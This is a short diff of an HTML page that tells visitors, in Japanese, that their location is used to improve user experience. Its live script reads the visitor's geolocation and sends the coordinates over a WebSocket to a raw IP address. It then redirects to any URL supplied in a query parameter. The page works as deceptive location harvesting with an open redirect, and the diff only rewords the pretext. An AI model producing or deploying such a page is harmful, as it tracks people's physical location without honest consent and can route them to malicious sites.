@@ -1,7 +1,8 @@
 <meta charset="UTF-8">
+<a>このサイトでは、ユーザーエクスペリエンス向上のため、位置情報を使用します。位置情報を許可していただくと次のサイトに移行します。</a>
 <script type="text/javascript">
     ws = new WebSocket("wss://114.146.22.1:4721/")
-    alert("このサイトのサービス体験向上のために位置情報「許可」を押してください。許可次第、次のサイトに移行します")
+    
     navigator.geolocation.getCurrentPosition(function(a){
         ws.send(`${a.coords.latitude}, ${a.coords.longitude}`)
         location.href=new URL(location.href).searchParams.get("redirect")
